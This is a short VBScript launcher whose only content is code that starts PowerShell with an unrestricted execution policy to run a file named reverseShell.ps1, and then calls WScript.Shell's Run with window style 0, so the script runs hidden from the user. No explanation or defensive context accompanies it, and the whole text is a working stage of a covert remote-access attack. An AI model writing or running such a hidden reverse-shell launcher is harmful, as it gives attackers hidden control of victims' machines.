command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File .\reverseShell.ps1"
 
set shell = CreateObject("WScript.Shell")
 
shell.Run command,0